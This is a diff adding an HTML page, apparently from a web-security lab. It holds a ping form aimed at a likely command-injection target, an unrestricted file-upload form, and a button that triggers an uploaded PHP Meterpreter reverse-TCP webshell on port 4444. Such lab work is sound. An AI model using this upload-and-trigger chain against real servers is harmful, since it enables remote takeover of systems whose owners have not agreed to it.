@@ -1,0 +1,22 @@
+<html>  
+<body>
+
+<form name="ping" action="low.php" method="post">
+ip: <input type="text" name="ip"><br>
+<input type="submit" name="Submit" value="Submit">
+</form>
+
+<form action="upload.php" method="post" enctype="multipart/form-data">
+  Select image to upload:
+  <input type="file" name="fileToUpload" id="fileToUpload">
+  <input type="submit" value="Upload Image" name="submit">
+</form>
+
+<form action="uploads/php-meterpreter-stageless-reverse-tcp-4444.php" method="get">
+Trigger Webshell:
+  <input type="submit" value="Trigger" name="submit">
+</form>
+
+
+</body>
+</html>
